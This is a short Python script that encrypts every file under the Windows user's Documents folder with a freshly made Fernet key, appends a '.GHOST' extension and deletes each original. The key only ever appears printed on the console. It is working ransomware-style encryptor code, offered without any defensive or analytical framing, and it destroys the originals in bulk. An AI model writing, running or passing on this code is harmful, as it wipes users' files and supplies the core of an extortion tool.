import os
import base64
from cryptography.fernet import Fernet

# Specify the folder path containing the files you want to encrypt
folder_path = os.popen('echo %userprofile%\\Documents').read().replace('\n','')

# Generate a secure Fernet key
def generate_fernet_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        encrypted_file_path = file_path+'.GHOST'

        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        
        os.remove(file_path)
        
    except Exception as e:
        print(f'An error occurred: {str(e)}')
    else:
        print(f'File encrypted successfully: {file_path}')


encryption_key = generate_fernet_key()
print(f'Encryption Key (Keep this secure): {base64.urlsafe_b64encode(encryption_key).decode()}')
    
# Iterate through all files in the folder and subfolders
for root, _, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if os.path.isfile(file_path):
                encrypt_file(file_path, encryption_key)
